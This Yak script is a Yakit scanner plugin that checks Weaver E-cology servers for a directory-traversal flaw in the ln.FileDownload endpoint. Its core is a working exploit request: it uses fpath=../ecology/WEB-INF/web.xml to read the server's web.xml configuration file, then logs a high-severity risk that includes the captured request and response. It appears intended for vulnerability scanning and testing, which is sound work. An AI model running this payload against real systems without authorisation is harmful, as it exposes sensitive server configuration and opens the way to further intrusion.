yakit.AutoInitYakit()

handleCheck = func(target, port) {
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    // 构造GET请求的路径，尝试进行目录遍历读取敏感文件
    url_path = "/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml"

    packet = `GET {{params(url_path)}} HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close`

    // 发送请求，尝试通过目录遍历读取文件
    rsp, req, _ = poc.HTTP(packet, 
        poc.params({
            "target": addr,
            "url_path": url_path
        }), 
        poc.https(isTls), 
        poc.redirectTimes(0)
    )

    // 检查是否返回了包含 `web.xml` 文件内容的标志
    if str.MatchAllOfSubString(rsp, `?xml version="1.0" encoding="UTF-8"`) {
        yakit.Info("%v 存在泛微 E-cology filedownload 目录遍历漏洞", addr)
        risk.NewRisk(
            addr,
            risk.title("泛微 E-cology filedownload 目录遍历漏洞"),
            risk.severity("high"),
            risk.titleVerbose("泛微 E-cology 文件下载目录遍历漏洞 - 敏感文件暴露"),
            risk.request(string(req)),
            risk.response(string(rsp)),
            risk.cve("no cve")
        )
    } else {
        yakit.Info("%v 未发现漏洞", addr)
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // 处理匹配结果
    if !result.IsOpen() {
        return
    }

    if len(result.Fingerprint.HttpFlows) > 0 {
        handleCheck(result.Target, result.Port)
    }
}
